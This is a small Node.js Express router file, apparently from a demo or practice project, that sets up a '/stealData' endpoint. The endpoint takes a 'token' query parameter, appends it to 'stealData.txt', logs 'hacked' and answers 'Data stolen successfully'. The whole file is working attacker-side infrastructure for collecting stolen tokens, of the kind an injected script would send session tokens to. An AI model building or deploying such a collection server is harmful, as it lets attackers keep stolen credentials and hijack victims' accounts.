const fs = require('fs');
const express = require('express');
const router = express.Router();
const path = require('path');
router.get('/stealData',async (req, res) => {
    console.log('hacked');
    
    const token = req.query.token;
    try {
        const filePath = path.join(__dirname,'stealData.txt');

        fs.appendFileSync(filePath, `\n\nToken: ${token}\n`);

        console.log('hacked!');
        

        res.status(200).json({message: 'Data stolen successfully', token});

    } catch (error) {
        console.log(error);
        
    }
})

module.exports = router